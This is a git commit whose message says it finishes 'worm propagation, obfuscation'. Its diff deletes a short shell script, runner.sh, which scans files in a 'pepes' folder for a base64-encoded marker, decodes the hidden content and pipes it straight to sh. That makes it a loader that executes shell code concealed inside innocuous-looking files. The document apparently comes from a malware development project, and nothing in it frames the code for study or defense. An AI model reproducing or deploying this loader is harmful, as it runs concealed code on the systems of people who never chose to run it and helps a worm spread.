2233c37602e92d71c6ca28f4fb70da45657d8fb3
C.S. Leach <lizardthunder@protonmail.ch>
2017-04-27 05:06:09 -0400

    finished worm propagation, obfuscation

--- runner.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/sh
-for file in $(find ./pepes); do
-    if cat $file | grep "U1RBUlRTQ1JJUFQ6I"; then
-        code="$(cat $file | grep -a 'U1RBUlRTQ1JJUFQ6I' | base64 -d | sed 's/STARTSCRIPT: //')"
-    fi
-done
-echo $code | sh -s 
